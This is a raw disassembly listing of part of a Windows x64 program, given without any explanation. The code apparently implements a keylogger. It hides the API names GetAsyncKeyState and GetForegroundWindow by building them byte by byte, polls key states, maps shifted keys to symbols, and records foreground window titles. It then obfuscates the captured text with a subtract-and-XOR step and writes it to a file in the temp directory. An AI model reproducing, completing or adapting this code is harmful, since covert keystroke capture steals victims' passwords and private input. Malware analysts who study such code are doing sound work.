   1400017f6:	83 fb 5a             	cmp    $0x5a,%ebx
   1400017f9:	7e e4                	jle    0x1400017df
   1400017fb:	bb 30 00 00 00       	mov    $0x30,%ebx
   140001800:	8b cb                	mov    %ebx,%ecx
   140001802:	ff 15 18 8f 01 00    	call   *0x18f18(%rip)        # 0x14001a720
   140001808:	66 41 3b c6          	cmp    %r14w,%ax
   14000180c:	75 5c                	jne    0x14000186a
   14000180e:	83 fb 35             	cmp    $0x35,%ebx
   140001811:	7f 31                	jg     0x140001844
   140001813:	74 2b                	je     0x140001840
   140001815:	8b cb                	mov    %ebx,%ecx
   140001817:	83 e9 30             	sub    $0x30,%ecx
   14000181a:	74 20                	je     0x14000183c
   14000181c:	ff c9                	dec    %ecx
   14000181e:	74 18                	je     0x140001838
   140001820:	ff c9                	dec    %ecx
   140001822:	74 10                	je     0x140001834
   140001824:	ff c9                	dec    %ecx
   140001826:	74 08                	je     0x140001830
   140001828:	ff c9                	dec    %ecx
   14000182a:	75 3e                	jne    0x14000186a
   14000182c:	b1 24                	mov    $0x24,%cl
   14000182e:	eb 35                	jmp    0x140001865
   140001830:	b1 23                	mov    $0x23,%cl
   140001832:	eb 31                	jmp    0x140001865
   140001834:	b1 40                	mov    $0x40,%cl
   140001836:	eb 2d                	jmp    0x140001865
   140001838:	b1 21                	mov    $0x21,%cl
   14000183a:	eb 29                	jmp    0x140001865
   14000183c:	b1 29                	mov    $0x29,%cl
   14000183e:	eb 25                	jmp    0x140001865
   140001840:	b1 25                	mov    $0x25,%cl
   140001842:	eb 21                	jmp    0x140001865
   140001844:	8b cb                	mov    %ebx,%ecx
   140001846:	83 e9 36             	sub    $0x36,%ecx
   140001849:	74 18                	je     0x140001863
   14000184b:	ff c9                	dec    %ecx
   14000184d:	74 10                	je     0x14000185f
   14000184f:	ff c9                	dec    %ecx
   140001851:	74 08                	je     0x14000185b
   140001853:	ff c9                	dec    %ecx
   140001855:	75 13                	jne    0x14000186a
   140001857:	b1 28                	mov    $0x28,%cl
   140001859:	eb 0a                	jmp    0x140001865
   14000185b:	b1 2a                	mov    $0x2a,%cl
   14000185d:	eb 06                	jmp    0x140001865
   14000185f:	b1 26                	mov    $0x26,%cl
   140001861:	eb 02                	jmp    0x140001865
   140001863:	b1 5e                	mov    $0x5e,%cl
   140001865:	e8 c6 04 00 00       	call   0x140001d30
   14000186a:	ff c3                	inc    %ebx
   14000186c:	83 fb 39             	cmp    $0x39,%ebx
   14000186f:	7e 8f                	jle    0x140001800
   140001871:	b9 dc 00 00 00       	mov    $0xdc,%ecx
   140001876:	ff 15 a4 8e 01 00    	call   *0x18ea4(%rip)        # 0x14001a720
   14000187c:	66 41 3b c6          	cmp    %r14w,%ax
   140001880:	75 07                	jne    0x140001889
   140001882:	b1 7c                	mov    $0x7c,%cl
   140001884:	e8 a7 04 00 00       	call   0x140001d30
   140001889:	b9 bc 00 00 00       	mov    $0xbc,%ecx
   14000188e:	ff 15 8c 8e 01 00    	call   *0x18e8c(%rip)        # 0x14001a720
   140001894:	66 41 3b c6          	cmp    %r14w,%ax
   140001898:	75 07                	jne    0x1400018a1
   14000189a:	b1 3c                	mov    $0x3c,%cl
   14000189c:	e8 8f 04 00 00       	call   0x140001d30
   1400018a1:	b9 be 00 00 00       	mov    $0xbe,%ecx
   1400018a6:	ff 15 74 8e 01 00    	call   *0x18e74(%rip)        # 0x14001a720
   1400018ac:	66 41 3b c6          	cmp    %r14w,%ax
   1400018b0:	75 07                	jne    0x1400018b9
   1400018b2:	b1 3e                	mov    $0x3e,%cl
   1400018b4:	e8 77 04 00 00       	call   0x140001d30
   1400018b9:	b9 bd 00 00 00       	mov    $0xbd,%ecx
   1400018be:	ff 15 5c 8e 01 00    	call   *0x18e5c(%rip)        # 0x14001a720
   1400018c4:	66 41 3b c6          	cmp    %r14w,%ax
   1400018c8:	75 07                	jne    0x1400018d1
   1400018ca:	b1 5f                	mov    $0x5f,%cl
   1400018cc:	e8 5f 04 00 00       	call   0x140001d30
   1400018d1:	b9 ba 00 00 00       	mov    $0xba,%ecx
   1400018d6:	ff 15 44 8e 01 00    	call   *0x18e44(%rip)        # 0x14001a720
   1400018dc:	66 41 3b c6          	cmp    %r14w,%ax
   1400018e0:	75 07                	jne    0x1400018e9
   1400018e2:	b1 3a                	mov    $0x3a,%cl
   1400018e4:	e8 47 04 00 00       	call   0x140001d30
   1400018e9:	b9 bb 00 00 00       	mov    $0xbb,%ecx
   1400018ee:	ff 15 2c 8e 01 00    	call   *0x18e2c(%rip)        # 0x14001a720
   1400018f4:	66 41 3b c6          	cmp    %r14w,%ax
   1400018f8:	75 07                	jne    0x140001901
   1400018fa:	b1 2b                	mov    $0x2b,%cl
   1400018fc:	e8 2f 04 00 00       	call   0x140001d30
   140001901:	b9 c0 00 00 00       	mov    $0xc0,%ecx
   140001906:	ff 15 14 8e 01 00    	call   *0x18e14(%rip)        # 0x14001a720
   14000190c:	66 41 3b c6          	cmp    %r14w,%ax
   140001910:	75 07                	jne    0x140001919
   140001912:	b1 7e                	mov    $0x7e,%cl
   140001914:	e8 17 04 00 00       	call   0x140001d30
   140001919:	b9 de 00 00 00       	mov    $0xde,%ecx
   14000191e:	ff 15 fc 8d 01 00    	call   *0x18dfc(%rip)        # 0x14001a720
   140001924:	66 41 3b c6          	cmp    %r14w,%ax
   140001928:	75 07                	jne    0x140001931
   14000192a:	b1 22                	mov    $0x22,%cl
   14000192c:	e8 ff 03 00 00       	call   0x140001d30
   140001931:	b9 bf 00 00 00       	mov    $0xbf,%ecx
   140001936:	ff 15 e4 8d 01 00    	call   *0x18de4(%rip)        # 0x14001a720
   14000193c:	66 41 3b c6          	cmp    %r14w,%ax
   140001940:	75 07                	jne    0x140001949
   140001942:	b1 3f                	mov    $0x3f,%cl
   140001944:	e8 e7 03 00 00       	call   0x140001d30
   140001949:	b9 db 00 00 00       	mov    $0xdb,%ecx
   14000194e:	ff 15 cc 8d 01 00    	call   *0x18dcc(%rip)        # 0x14001a720
   140001954:	66 41 3b c6          	cmp    %r14w,%ax
   140001958:	75 07                	jne    0x140001961
   14000195a:	b1 7b                	mov    $0x7b,%cl
   14000195c:	e8 cf 03 00 00       	call   0x140001d30
   140001961:	b9 dd 00 00 00       	mov    $0xdd,%ecx
   140001966:	ff 15 b4 8d 01 00    	call   *0x18db4(%rip)        # 0x14001a720
   14000196c:	66 41 3b c6          	cmp    %r14w,%ax
   140001970:	75 07                	jne    0x140001979
   140001972:	b1 7d                	mov    $0x7d,%cl
   140001974:	e8 b7 03 00 00       	call   0x140001d30
   140001979:	b9 e2 00 00 00       	mov    $0xe2,%ecx
   14000197e:	ff 15 9c 8d 01 00    	call   *0x18d9c(%rip)        # 0x14001a720
   140001984:	66 41 3b c6          	cmp    %r14w,%ax
   140001988:	0f 85 53 02 00 00    	jne    0x140001be1
   14000198e:	b1 3e                	mov    $0x3e,%cl
   140001990:	e9 47 02 00 00       	jmp    0x140001bdc
   140001995:	bf 41 00 00 00       	mov    $0x41,%edi
   14000199a:	8b cf                	mov    %edi,%ecx
   14000199c:	ff 15 7e 8d 01 00    	call   *0x18d7e(%rip)        # 0x14001a720
   1400019a2:	66 41 3b c6          	cmp    %r14w,%ax
   1400019a6:	75 75                	jne    0x140001a1d
   1400019a8:	8d 4f 20             	lea    0x20(%rdi),%ecx
   1400019ab:	e8 80 03 00 00       	call   0x140001d30
   1400019b0:	83 ff 56             	cmp    $0x56,%edi
   1400019b3:	75 68                	jne    0x140001a1d
   1400019b5:	8d 4f bb             	lea    -0x45(%rdi),%ecx
   1400019b8:	ff 15 ca f8 00 00    	call   *0xf8ca(%rip)        # 0x140011288
   1400019be:	66 85 c0             	test   %ax,%ax
   1400019c1:	74 5a                	je     0x140001a1d
   1400019c3:	33 c9                	xor    %ecx,%ecx
   1400019c5:	ff 15 d5 f8 00 00    	call   *0xf8d5(%rip)        # 0x1400112a0
   1400019cb:	85 c0                	test   %eax,%eax
   1400019cd:	74 4e                	je     0x140001a1d
   1400019cf:	8d 4f ab             	lea    -0x55(%rdi),%ecx
   1400019d2:	ff 15 b8 f8 00 00    	call   *0xf8b8(%rip)        # 0x140011290
   1400019d8:	48 8b d8             	mov    %rax,%rbx
   1400019db:	48 85 c0             	test   %rax,%rax
   1400019de:	75 11                	jne    0x1400019f1
   1400019e0:	8d 4f b7             	lea    -0x49(%rdi),%ecx
   1400019e3:	ff 15 a7 f8 00 00    	call   *0xf8a7(%rip)        # 0x140011290
   1400019e9:	48 8b d8             	mov    %rax,%rbx
   1400019ec:	48 85 c0             	test   %rax,%rax
   1400019ef:	74 26                	je     0x140001a17
   1400019f1:	48 8b cb             	mov    %rbx,%rcx
   1400019f4:	e8 57 11 00 00       	call   0x140002b50
   1400019f9:	48 3d 00 01 00 00    	cmp    $0x100,%rax
   1400019ff:	73 16                	jae    0x140001a17
   140001a01:	b1 3c                	mov    $0x3c,%cl
   140001a03:	e8 28 03 00 00       	call   0x140001d30
   140001a08:	48 8b cb             	mov    %rbx,%rcx
   140001a0b:	e8 80 03 00 00       	call   0x140001d90
   140001a10:	b1 3e                	mov    $0x3e,%cl
   140001a12:	e8 19 03 00 00       	call   0x140001d30
   140001a17:	ff 15 7b f8 00 00    	call   *0xf87b(%rip)        # 0x140011298
   140001a1d:	ff c7                	inc    %edi
   140001a1f:	83 ff 5a             	cmp    $0x5a,%edi
   140001a22:	0f 8e 72 ff ff ff    	jle    0x14000199a
   140001a28:	bb 30 00 00 00       	mov    $0x30,%ebx
   140001a2d:	8b cb                	mov    %ebx,%ecx
   140001a2f:	ff 15 eb 8c 01 00    	call   *0x18ceb(%rip)        # 0x14001a720
   140001a35:	66 41 3b c6          	cmp    %r14w,%ax
   140001a39:	75 07                	jne    0x140001a42
   140001a3b:	8a cb                	mov    %bl,%cl
   140001a3d:	e8 ee 02 00 00       	call   0x140001d30
   140001a42:	ff c3                	inc    %ebx
   140001a44:	83 fb 39             	cmp    $0x39,%ebx
   140001a47:	7e e4                	jle    0x140001a2d
   140001a49:	b9 dc 00 00 00       	mov    $0xdc,%ecx
   140001a4e:	ff 15 cc 8c 01 00    	call   *0x18ccc(%rip)        # 0x14001a720
   140001a54:	66 41 3b c6          	cmp    %r14w,%ax
   140001a58:	75 07                	jne    0x140001a61
   140001a5a:	b1 5c                	mov    $0x5c,%cl
   140001a5c:	e8 cf 02 00 00       	call   0x140001d30
   140001a61:	b9 bc 00 00 00       	mov    $0xbc,%ecx
   140001a66:	ff 15 b4 8c 01 00    	call   *0x18cb4(%rip)        # 0x14001a720
   140001a6c:	66 41 3b c6          	cmp    %r14w,%ax
   140001a70:	75 07                	jne    0x140001a79
   140001a72:	b1 2c                	mov    $0x2c,%cl
   140001a74:	e8 b7 02 00 00       	call   0x140001d30
   140001a79:	b9 be 00 00 00       	mov    $0xbe,%ecx
   140001a7e:	ff 15 9c 8c 01 00    	call   *0x18c9c(%rip)        # 0x14001a720
   140001a84:	66 41 3b c6          	cmp    %r14w,%ax
   140001a88:	75 07                	jne    0x140001a91
   140001a8a:	b1 2e                	mov    $0x2e,%cl
   140001a8c:	e8 9f 02 00 00       	call   0x140001d30
   140001a91:	b9 bd 00 00 00       	mov    $0xbd,%ecx
   140001a96:	ff 15 84 8c 01 00    	call   *0x18c84(%rip)        # 0x14001a720
   140001a9c:	66 41 3b c6          	cmp    %r14w,%ax
   140001aa0:	75 07                	jne    0x140001aa9
   140001aa2:	b1 2d                	mov    $0x2d,%cl
   140001aa4:	e8 87 02 00 00       	call   0x140001d30
   140001aa9:	b9 ba 00 00 00       	mov    $0xba,%ecx
   140001aae:	ff 15 6c 8c 01 00    	call   *0x18c6c(%rip)        # 0x14001a720
   140001ab4:	66 41 3b c6          	cmp    %r14w,%ax
   140001ab8:	75 07                	jne    0x140001ac1
   140001aba:	b1 3b                	mov    $0x3b,%cl
   140001abc:	e8 6f 02 00 00       	call   0x140001d30
   140001ac1:	b9 bb 00 00 00       	mov    $0xbb,%ecx
   140001ac6:	ff 15 54 8c 01 00    	call   *0x18c54(%rip)        # 0x14001a720
   140001acc:	66 41 3b c6          	cmp    %r14w,%ax
   140001ad0:	75 07                	jne    0x140001ad9
   140001ad2:	b1 3d                	mov    $0x3d,%cl
   140001ad4:	e8 57 02 00 00       	call   0x140001d30
   140001ad9:	b9 c0 00 00 00       	mov    $0xc0,%ecx
   140001ade:	ff 15 3c 8c 01 00    	call   *0x18c3c(%rip)        # 0x14001a720
   140001ae4:	66 41 3b c6          	cmp    %r14w,%ax
   140001ae8:	75 07                	jne    0x140001af1
   140001aea:	b1 60                	mov    $0x60,%cl
   140001aec:	e8 3f 02 00 00       	call   0x140001d30
   140001af1:	b9 de 00 00 00       	mov    $0xde,%ecx
   140001af6:	ff 15 24 8c 01 00    	call   *0x18c24(%rip)        # 0x14001a720
   140001afc:	66 41 3b c6          	cmp    %r14w,%ax
   140001b00:	75 07                	jne    0x140001b09
   140001b02:	b1 27                	mov    $0x27,%cl
   140001b04:	e8 27 02 00 00       	call   0x140001d30
   140001b09:	b9 bf 00 00 00       	mov    $0xbf,%ecx
   140001b0e:	ff 15 0c 8c 01 00    	call   *0x18c0c(%rip)        # 0x14001a720
   140001b14:	66 41 3b c6          	cmp    %r14w,%ax
   140001b18:	75 07                	jne    0x140001b21
   140001b1a:	b1 2f                	mov    $0x2f,%cl
   140001b1c:	e8 0f 02 00 00       	call   0x140001d30
   140001b21:	b9 db 00 00 00       	mov    $0xdb,%ecx
   140001b26:	ff 15 f4 8b 01 00    	call   *0x18bf4(%rip)        # 0x14001a720
   140001b2c:	66 41 3b c6          	cmp    %r14w,%ax
   140001b30:	75 07                	jne    0x140001b39
   140001b32:	b1 5b                	mov    $0x5b,%cl
   140001b34:	e8 f7 01 00 00       	call   0x140001d30
   140001b39:	b9 dd 00 00 00       	mov    $0xdd,%ecx
   140001b3e:	ff 15 dc 8b 01 00    	call   *0x18bdc(%rip)        # 0x14001a720
   140001b44:	66 41 3b c6          	cmp    %r14w,%ax
   140001b48:	75 07                	jne    0x140001b51
   140001b4a:	b1 5d                	mov    $0x5d,%cl
   140001b4c:	e8 df 01 00 00       	call   0x140001d30
   140001b51:	b9 e2 00 00 00       	mov    $0xe2,%ecx
   140001b56:	ff 15 c4 8b 01 00    	call   *0x18bc4(%rip)        # 0x14001a720
   140001b5c:	66 41 3b c6          	cmp    %r14w,%ax
   140001b60:	75 07                	jne    0x140001b69
   140001b62:	b1 3c                	mov    $0x3c,%cl
   140001b64:	e8 c7 01 00 00       	call   0x140001d30
   140001b69:	b9 6f 00 00 00       	mov    $0x6f,%ecx
   140001b6e:	ff 15 ac 8b 01 00    	call   *0x18bac(%rip)        # 0x14001a720
   140001b74:	66 41 3b c6          	cmp    %r14w,%ax
   140001b78:	75 07                	jne    0x140001b81
   140001b7a:	b1 2f                	mov    $0x2f,%cl
   140001b7c:	e8 af 01 00 00       	call   0x140001d30
   140001b81:	b9 6a 00 00 00       	mov    $0x6a,%ecx
   140001b86:	ff 15 94 8b 01 00    	call   *0x18b94(%rip)        # 0x14001a720
   140001b8c:	66 41 3b c6          	cmp    %r14w,%ax
   140001b90:	75 07                	jne    0x140001b99
   140001b92:	b1 2a                	mov    $0x2a,%cl
   140001b94:	e8 97 01 00 00       	call   0x140001d30
   140001b99:	b9 6d 00 00 00       	mov    $0x6d,%ecx
   140001b9e:	ff 15 7c 8b 01 00    	call   *0x18b7c(%rip)        # 0x14001a720
   140001ba4:	66 41 3b c6          	cmp    %r14w,%ax
   140001ba8:	75 07                	jne    0x140001bb1
   140001baa:	b1 2d                	mov    $0x2d,%cl
   140001bac:	e8 7f 01 00 00       	call   0x140001d30
   140001bb1:	b9 6b 00 00 00       	mov    $0x6b,%ecx
   140001bb6:	ff 15 64 8b 01 00    	call   *0x18b64(%rip)        # 0x14001a720
   140001bbc:	66 41 3b c6          	cmp    %r14w,%ax
   140001bc0:	75 07                	jne    0x140001bc9
   140001bc2:	b1 2b                	mov    $0x2b,%cl
   140001bc4:	e8 67 01 00 00       	call   0x140001d30
   140001bc9:	b9 6e 00 00 00       	mov    $0x6e,%ecx
   140001bce:	ff 15 4c 8b 01 00    	call   *0x18b4c(%rip)        # 0x14001a720
   140001bd4:	66 41 3b c6          	cmp    %r14w,%ax
   140001bd8:	75 07                	jne    0x140001be1
   140001bda:	b1 2e                	mov    $0x2e,%cl
   140001bdc:	e8 4f 01 00 00       	call   0x140001d30
   140001be1:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140001be6:	ff 15 34 f4 00 00    	call   *0xf434(%rip)        # 0x140011020
   140001bec:	83 3d 3d 8d 01 00 01 	cmpl   $0x1,0x18d3d(%rip)        # 0x14001a930
   140001bf3:	0f 85 ce f6 ff ff    	jne    0x1400012c7
   140001bf9:	33 c0                	xor    %eax,%eax
   140001bfb:	48 8b 8d 60 0c 00 00 	mov    0xc60(%rbp),%rcx
   140001c02:	48 33 cc             	xor    %rsp,%rcx
   140001c05:	e8 36 16 00 00       	call   0x140003240
   140001c0a:	4c 8d 9c 24 70 0d 00 	lea    0xd70(%rsp),%r11
   140001c11:	00 
   140001c12:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140001c16:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001c1a:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140001c1e:	49 8b e3             	mov    %r11,%rsp
   140001c21:	41 5f                	pop    %r15
   140001c23:	41 5e                	pop    %r14
   140001c25:	5d                   	pop    %rbp
   140001c26:	c3                   	ret
   140001c27:	cc                   	int3
   140001c28:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c2d:	55                   	push   %rbp
   140001c2e:	48 8d ac 24 b0 fe ff 	lea    -0x150(%rsp),%rbp
   140001c35:	ff 
   140001c36:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   140001c3d:	48 8b 05 bc 73 01 00 	mov    0x173bc(%rip),%rax        # 0x140019000
   140001c44:	48 33 c4             	xor    %rsp,%rax
   140001c47:	48 89 85 40 01 00 00 	mov    %rax,0x140(%rbp)
   140001c4e:	48 8d 4d 41          	lea    0x41(%rbp),%rcx
   140001c52:	33 d2                	xor    %edx,%edx
   140001c54:	41 b8 f3 00 00 00    	mov    $0xf3,%r8d
   140001c5a:	c7 45 30 47 65 74 41 	movl   $0x41746547,0x30(%rbp)
   140001c61:	c7 45 34 73 79 6e 63 	movl   $0x636e7973,0x34(%rbp)
   140001c68:	c7 45 38 4b 65 79 53 	movl   $0x5379654b,0x38(%rbp)
   140001c6f:	c7 45 3c 74 61 74 65 	movl   $0x65746174,0x3c(%rbp)
   140001c76:	c6 45 40 00          	movb   $0x0,0x40(%rbp)
   140001c7a:	e8 21 0b 00 00       	call   0x1400027a0
   140001c7f:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   140001c84:	33 d2                	xor    %edx,%edx
   140001c86:	41 b8 f0 00 00 00    	mov    $0xf0,%r8d
   140001c8c:	c7 44 24 20 47 65 74 	movl   $0x46746547,0x20(%rsp)
   140001c93:	46 
   140001c94:	c7 44 24 24 6f 72 65 	movl   $0x6765726f,0x24(%rsp)
   140001c9b:	67 
   140001c9c:	c7 44 24 28 72 6f 75 	movl   $0x6e756f72,0x28(%rsp)
   140001ca3:	6e 
   140001ca4:	c7 44 24 2c 64 57 69 	movl   $0x6e695764,0x2c(%rsp)
   140001cab:	6e 
   140001cac:	c7 44 24 30 64 6f 77 	movl   $0x776f64,0x30(%rsp)
   140001cb3:	00 
   140001cb4:	e8 e7 0a 00 00       	call   0x1400027a0
   140001cb9:	48 8d 0d b0 f8 00 00 	lea    0xf8b0(%rip),%rcx        # 0x140011570
   140001cc0:	ff 15 7a f3 00 00    	call   *0xf37a(%rip)        # 0x140011040
   140001cc6:	48 8b d8             	mov    %rax,%rbx
   140001cc9:	48 85 c0             	test   %rax,%rax
   140001ccc:	74 3f                	je     0x140001d0d
   140001cce:	48 8d 55 30          	lea    0x30(%rbp),%rdx
   140001cd2:	48 8b c8             	mov    %rax,%rcx
   140001cd5:	ff 15 5d f3 00 00    	call   *0xf35d(%rip)        # 0x140011038
   140001cdb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001ce0:	48 8b cb             	mov    %rbx,%rcx
   140001ce3:	48 89 05 36 8a 01 00 	mov    %rax,0x18a36(%rip)        # 0x14001a720
   140001cea:	ff 15 48 f3 00 00    	call   *0xf348(%rip)        # 0x140011038
   140001cf0:	48 83 3d 28 8a 01 00 	cmpq   $0x0,0x18a28(%rip)        # 0x14001a720
   140001cf7:	00 
   140001cf8:	48 89 05 29 8a 01 00 	mov    %rax,0x18a29(%rip)        # 0x14001a728
   140001cff:	74 0c                	je     0x140001d0d
   140001d01:	48 85 c0             	test   %rax,%rax
   140001d04:	74 07                	je     0x140001d0d
   140001d06:	b8 01 00 00 00       	mov    $0x1,%eax
   140001d0b:	eb 02                	jmp    0x140001d0f
   140001d0d:	33 c0                	xor    %eax,%eax
   140001d0f:	48 8b 8d 40 01 00 00 	mov    0x140(%rbp),%rcx
   140001d16:	48 33 cc             	xor    %rsp,%rcx
   140001d19:	e8 22 15 00 00       	call   0x140003240
   140001d1e:	48 8b 9c 24 60 02 00 	mov    0x260(%rsp),%rbx
   140001d25:	00 
   140001d26:	48 81 c4 50 02 00 00 	add    $0x250,%rsp
   140001d2d:	5d                   	pop    %rbp
   140001d2e:	c3                   	ret
   140001d2f:	cc                   	int3
   140001d30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d35:	57                   	push   %rdi
   140001d36:	48 83 ec 20          	sub    $0x20,%rsp
   140001d3a:	8a d9                	mov    %cl,%bl
   140001d3c:	48 8d 3d ed 89 01 00 	lea    0x189ed(%rip),%rdi        # 0x14001a730
   140001d43:	48 8b cf             	mov    %rdi,%rcx
   140001d46:	e8 05 0e 00 00       	call   0x140002b50
   140001d4b:	83 c0 02             	add    $0x2,%eax
   140001d4e:	3d 00 02 00 00       	cmp    $0x200,%eax
   140001d53:	7c 07                	jl     0x140001d5c
   140001d55:	33 c9                	xor    %ecx,%ecx
   140001d57:	e8 a4 f2 ff ff       	call   0x140001000
   140001d5c:	48 8b cf             	mov    %rdi,%rcx
   140001d5f:	e8 ec 0d 00 00       	call   0x140002b50
   140001d64:	48 63 c8             	movslq %eax,%rcx
   140001d67:	ff c0                	inc    %eax
   140001d69:	88 1c 39             	mov    %bl,(%rcx,%rdi,1)
   140001d6c:	48 63 c8             	movslq %eax,%rcx
   140001d6f:	48 81 f9 00 02 00 00 	cmp    $0x200,%rcx
   140001d76:	73 0f                	jae    0x140001d87
   140001d78:	c6 04 39 00          	movb   $0x0,(%rcx,%rdi,1)
   140001d7c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001d81:	48 83 c4 20          	add    $0x20,%rsp
   140001d85:	5f                   	pop    %rdi
   140001d86:	c3                   	ret
   140001d87:	e8 d4 03 00 00       	call   0x140002160
   140001d8c:	cc                   	int3
   140001d8d:	cc                   	int3
   140001d8e:	cc                   	int3
   140001d8f:	cc                   	int3
   140001d90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d95:	57                   	push   %rdi
   140001d96:	48 83 ec 20          	sub    $0x20,%rsp
   140001d9a:	48 8b f9             	mov    %rcx,%rdi
   140001d9d:	48 8d 0d 8c 89 01 00 	lea    0x1898c(%rip),%rcx        # 0x14001a730
   140001da4:	e8 a7 0d 00 00       	call   0x140002b50
   140001da9:	48 8b cf             	mov    %rdi,%rcx
   140001dac:	48 8b d8             	mov    %rax,%rbx
   140001daf:	e8 9c 0d 00 00       	call   0x140002b50
   140001db4:	8d 50 01             	lea    0x1(%rax),%edx
   140001db7:	03 d3                	add    %ebx,%edx
   140001db9:	81 fa 00 02 00 00    	cmp    $0x200,%edx
   140001dbf:	7c 07                	jl     0x140001dc8
   140001dc1:	33 c9                	xor    %ecx,%ecx
   140001dc3:	e8 38 f2 ff ff       	call   0x140001000
   140001dc8:	48 8d 0d 61 89 01 00 	lea    0x18961(%rip),%rcx        # 0x14001a730
   140001dcf:	48 8b d7             	mov    %rdi,%rdx
   140001dd2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001dd7:	48 83 c4 20          	add    $0x20,%rsp
   140001ddb:	5f                   	pop    %rdi
   140001ddc:	e9 ff 0b 00 00       	jmp    0x1400029e0
   140001de1:	cc                   	int3
   140001de2:	cc                   	int3
   140001de3:	cc                   	int3
   140001de4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001de9:	57                   	push   %rdi
   140001dea:	48 83 ec 20          	sub    $0x20,%rsp
   140001dee:	48 8b f9             	mov    %rcx,%rdi
   140001df1:	48 8d 15 38 f5 00 00 	lea    0xf538(%rip),%rdx        # 0x140011330
   140001df8:	48 8d 0d 39 f5 00 00 	lea    0xf539(%rip),%rcx        # 0x140011338
   140001dff:	e8 b0 0f 00 00       	call   0x140002db4
   140001e04:	48 8b d8             	mov    %rax,%rbx
   140001e07:	48 85 c0             	test   %rax,%rax
   140001e0a:	74 1a                	je     0x140001e26
   140001e0c:	48 8d 15 41 f5 00 00 	lea    0xf541(%rip),%rdx        # 0x140011354
   140001e13:	4c 8b c7             	mov    %rdi,%r8
   140001e16:	48 8b c8             	mov    %rax,%rcx
   140001e19:	e8 a2 0f 00 00       	call   0x140002dc0
   140001e1e:	48 8b cb             	mov    %rbx,%rcx
   140001e21:	e8 4e 0e 00 00       	call   0x140002c74
   140001e26:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001e2b:	48 83 c4 20          	add    $0x20,%rsp
   140001e2f:	5f                   	pop    %rdi
   140001e30:	c3                   	ret
   140001e31:	cc                   	int3
   140001e32:	cc                   	int3
   140001e33:	cc                   	int3
   140001e34:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001e39:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001e3e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001e43:	57                   	push   %rdi
   140001e44:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140001e4b:	48 8b 05 ae 71 01 00 	mov    0x171ae(%rip),%rax        # 0x140019000
   140001e52:	48 33 c4             	xor    %rsp,%rax
   140001e55:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140001e5c:	00 
   140001e5d:	48 8b d9             	mov    %rcx,%rbx
   140001e60:	e8 eb 0c 00 00       	call   0x140002b50
   140001e65:	48 63 f8             	movslq %eax,%rdi
   140001e68:	48 8b cf             	mov    %rdi,%rcx
   140001e6b:	e8 20 01 00 00       	call   0x140001f90
   140001e70:	4c 8b c7             	mov    %rdi,%r8
   140001e73:	48 8b d3             	mov    %rbx,%rdx
   140001e76:	48 8b c8             	mov    %rax,%rcx
   140001e79:	48 8b f0             	mov    %rax,%rsi
   140001e7c:	e8 9f 03 00 00       	call   0x140002220
   140001e81:	48 85 ff             	test   %rdi,%rdi
   140001e84:	7e 16                	jle    0x140001e9c
   140001e86:	48 8b ce             	mov    %rsi,%rcx
   140001e89:	48 8b d7             	mov    %rdi,%rdx
   140001e8c:	8a 01                	mov    (%rcx),%al
   140001e8e:	2c 40                	sub    $0x40,%al
   140001e90:	34 bc                	xor    $0xbc,%al
   140001e92:	88 01                	mov    %al,(%rcx)
   140001e94:	48 ff c1             	inc    %rcx
   140001e97:	48 ff ca             	dec    %rdx
   140001e9a:	75 f0                	jne    0x140001e8c
   140001e9c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140001ea1:	b9 04 01 00 00       	mov    $0x104,%ecx
   140001ea6:	ff 15 9c f1 00 00    	call   *0xf19c(%rip)        # 0x140011048
   140001eac:	48 8d 15 9d f6 00 00 	lea    0xf69d(%rip),%rdx        # 0x140011550
   140001eb3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001eb8:	e8 23 0b 00 00       	call   0x1400029e0
   140001ebd:	48 8d 15 98 f6 00 00 	lea    0xf698(%rip),%rdx        # 0x14001155c
   140001ec4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001ec9:	e8 e6 0e 00 00       	call   0x140002db4
   140001ece:	48 8b e8             	mov    %rax,%rbp
   140001ed1:	48 85 c0             	test   %rax,%rax
   140001ed4:	75 1a                	jne    0x140001ef0
   140001ed6:	48 8d 0d 83 f6 00 00 	lea    0xf683(%rip),%rcx        # 0x140011560
   140001edd:	e8 02 ff ff ff       	call   0x140001de4
   140001ee2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001ee7:	e8 f8 fe ff ff       	call   0x140001de4
   140001eec:	33 c0                	xor    %eax,%eax
   140001eee:	eb 28                	jmp    0x140001f18
   140001ef0:	4c 8b c8             	mov    %rax,%r9
   140001ef3:	4c 8b c7             	mov    %rdi,%r8
   140001ef6:	ba 01 00 00 00       	mov    $0x1,%edx
   140001efb:	48 8b ce             	mov    %rsi,%rcx
   140001efe:	e8 75 11 00 00       	call   0x140003078
   140001f03:	48 8b ce             	mov    %rsi,%rcx
   140001f06:	48 8b d8             	mov    %rax,%rbx
   140001f09:	e8 2a 01 00 00       	call   0x140002038
   140001f0e:	48 8b cd             	mov    %rbp,%rcx
   140001f11:	e8 5e 0d 00 00       	call   0x140002c74
   140001f16:	8b c3                	mov    %ebx,%eax
   140001f18:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140001f1f:	00 
   140001f20:	48 33 cc             	xor    %rsp,%rcx
   140001f23:	e8 18 13 00 00       	call   0x140003240
   140001f28:	4c 8d 9c 24 40 01 00 	lea    0x140(%rsp),%r11
   140001f2f:	00 
   140001f30:	49 8b 5b 18          	mov    0x18(%r11),%rbx
